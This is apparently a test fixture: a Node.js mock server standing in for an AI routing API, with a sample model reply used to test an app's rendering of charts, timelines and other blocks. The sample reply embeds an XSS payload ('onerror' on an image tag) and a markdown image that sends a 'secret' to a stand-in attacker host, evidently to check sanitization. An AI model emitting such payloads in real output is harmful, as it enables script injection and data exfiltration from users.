// A stand-in for MiniRouter, so the app can be tested without a key or any cost.
// It records every request in `requests` so tests can check what would have been sent.
import http from 'node:http';

const PNG = 'iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mNk+M/wHwAEBgIApD5fRAAAAABJRU5ErkJggg==';

// A quarter second of silence, so playback can be tested with real audio.
function silentWav() {
  const samples = 4000;
  const b = Buffer.alloc(44 + samples * 2);
  b.write('RIFF', 0); b.writeUInt32LE(36 + samples * 2, 4); b.write('WAVEfmt ', 8); b.writeUInt32LE(16, 16);
  b.writeUInt16LE(1, 20); b.writeUInt16LE(1, 22); b.writeUInt32LE(16000, 24); b.writeUInt32LE(32000, 28);
  b.writeUInt16LE(2, 32); b.writeUInt16LE(16, 34); b.write('data', 36); b.writeUInt32LE(samples * 2, 40);
  return b;
}

export const SAMPLE = `Here is the short answer: population grew slowly until about 1900, then very fast.

\`\`\`chart
{"type":"line","title":"World population and urban population","caption":"Approximate figures, for illustration.","xLabel":"Year","yLabel":"Billions","labels":["1800","1900","1950","2000","2020"],"series":[{"name":"Total","data":[1,1.6,2.5,6.1,7.8]},{"name":"Urban","data":[0.03,0.2,0.75,2.9,4.4]}]}
\`\`\`

## Key moments

\`\`\`timeline
{"title":"Milestones","events":[{"date":"1804","title":"One billion people","detail":"Reached after all of prior human history."},{"date":"1927","title":"Two billion"},{"date":"2022","title":"Eight billion","detail":"The UN estimate for November 2022."}]}
\`\`\`

\`\`\`stats
{"title":"Today","items":[{"value":"8.2 billion","label":"People alive","note":"2025 estimate"},{"value":"57%","label":"Live in cities"},{"value":"2.2","label":"Children per woman"}]}
\`\`\`

\`\`\`mermaid
flowchart LR
  A["Better farming"] --> B["More food"]
  B --> C["Lower mortality"]
  C --> D["Population growth"]
\`\`\`

\`\`\`steps
{"title":"The demographic transition","steps":[{"title":"High birth and death rates","detail":"Population is stable."},{"title":"Death rates fall","detail":"Population grows quickly."},{"title":"Birth rates fall","detail":"Growth slows."}]}
\`\`\`

\`\`\`chart
{"type":"bar","title":"Population by region, 2020","unit":"bn","labels":["Asia","Africa","Europe","Americas"],"series":[{"name":"People","data":[4.6,1.3,0.75,1.0]}]}
\`\`\`

| Region | Trend |
| --- | --- |
| Africa | Fastest growth |
| Europe | Near flat |

The growth rate follows \\(r = \\frac{\\ln(P_t / P_0)}{t}\\), which costs $5 and $10 to compute. <img src=x onerror="window.__xss=1"> <b>not bold</b>

![tracker](https://evil.example/leak.png?q=secret)

\`\`\`python
def double(x):
    return x * 2
\`\`\`

Source: [UN Population Division](https://population.un.org/).
`;

export function startMock({ reply = SAMPLE } = {}) {
  const requests = [];
  const videos = new Map();
  const server = http.createServer(async (req, res) => {
    const chunks = [];
    for await (const c of req) chunks.push(c);
    const raw = Buffer.concat(chunks).toString();
    const body = raw ? JSON.parse(raw) : null;
    if (req.url === '/audio/speech') {
      requests.push({ method: req.method, url: req.url, body });
      if (body.input.includes('FAIL')) { res.writeHead(402, { 'content-type': 'application/json' }); return res.end(JSON.stringify({ error: { message: 'Insufficient credits' } })); }
      res.writeHead(200, { 'content-type': 'audio/wav' });
      return res.end(silentWav());
    }
    if (req.url === '/audio/transcriptions') {
      requests.push({ method: req.method, url: req.url, body });
      res.writeHead(200, { 'content-type': 'application/json' });
      return res.end(JSON.stringify({ text: ' Hello from my voice. ' }));
    }
    requests.push({ method: req.method, url: req.url, auth: req.headers.authorization, body });
    const json = (status, value, headers = {}) => {
      res.writeHead(status, { 'content-type': 'application/json', ...headers });
      res.end(JSON.stringify(value));
    };
    if (req.url === '/models') {
      return json(200, { data: [
        { id: 'minirouter/auto', name: 'Auto', owned_by: 'minirouter', type: 'language', tags: ['auto'], pricing: { input: '0.000002', output: '0.00001' } },
        { id: 'test/vision', name: 'Test Vision', owned_by: 'test', type: 'language', tags: ['tool-use'], modalities: { input: ['text', 'image'], output: ['text'] }, pricing: { input: '0.000001', output: '0.000002' } },
        { id: 'test/thinking', name: 'Test Thinking', owned_by: 'test', type: 'language', tags: ['reasoning'], modalities: { input: ['text'], output: ['text'] }, pricing: {} },
        { id: 'test/plain', name: 'Test Plain', owned_by: 'test', type: 'language', tags: [], modalities: { input: ['text'], output: ['text'] }, pricing: {} },
        { id: 'test/no-tools-route', name: 'No Tools Route', owned_by: 'test', type: 'language', tags: ['tool-use'], modalities: { input: ['text'], output: ['text'] }, pricing: {} },
        { id: 'openai/gpt-image-1-mini', name: 'Image Mini', owned_by: 'openai', type: 'image', pricing: { image: '0.0023' }, image: { controls: { required: { size: '1024x1024', quality: 'low' } } } },
        { id: 'google/veo-3.1-lite-generate-001', name: 'Veo Lite', owned_by: 'google', type: 'video', pricing: { prices: [{ tier: '720p', audio: false, usd_per_second: '0.0315' }] }, video: { controls: { seconds: [4, 6], sizes: [{ size: '1280x720', tier: '720p' }] } } },
        { id: 'openai/tts-1', name: 'TTS', owned_by: 'openai', type: 'speech', pricing: {} },
      ] });
    }
    if (req.url === '/chat/completions') {
      if (body.model === 'test/no-tools-route' && body.tools) return json(400, { error: { message: 'Tools unsupported on this route' } });
      if (body.model === 'test/fail') return json(402, { error: { message: 'Insufficient credits' } });
      res.writeHead(200, { 'content-type': 'text/event-stream', 'x-minirouter-model': 'test/served', 'x-minirouter-balance-usd': '4.25' });
      res.write(': keep-alive\n\n');
      if (body.model === 'test/thinking') {
        for (let i = 0; i < 30; i += 1) {
          res.write(`data: ${JSON.stringify({ choices: [{ delta: { reasoning: `Step ${i} of working it out.\n` } }] })}\n\n`);
          await new Promise((r) => { setTimeout(r, 100); });
        }
      }
      for (const piece of reply.match(/[\s\S]{1,60}/g)) {
        res.write(`data: ${JSON.stringify({ choices: [{ delta: { content: piece } }] })}\n\n`);
        await new Promise((r) => { setTimeout(r, 2); });
      }
      res.write(`data: ${JSON.stringify({ choices: [], usage: { cost: 0.0042, server_tool_use: { google_search_requests: 1 } } })}\n\n`);
      res.write('data: [DONE]\n\n');
      return res.end();
    }
    if (req.url === '/images/generations') {
      return json(200, { data: [{ b64_json: PNG }] }, { 'x-minirouter-cost-usd': '0.0023' });
    }
    if (req.url === '/videos' && req.method === 'POST') {
      videos.set('vid_1', 0);
      return json(200, { id: 'vid_1', status: 'queued' });
    }
    if (req.url === '/videos/vid_1/content') {
      res.writeHead(200, { 'content-type': 'video/mp4' });
      return res.end(Buffer.from('fake-mp4-bytes'));
    }
    if (req.url === '/videos/vid_1') {
      const n = videos.get('vid_1') + 1;
      videos.set('vid_1', n);
      return json(200, n < 2 ? { id: 'vid_1', status: 'in_progress', progress: 50 } : { id: 'vid_1', status: 'completed', progress: 100, cost: { usd: 0.126 } });
    }
    return json(404, { error: 'not found' });
  });
  return new Promise((resolve) => {
    server.listen(0, '127.0.0.1', () => resolve({ server, requests, url: `http://127.0.0.1:${server.address().port}` }));
  });
}
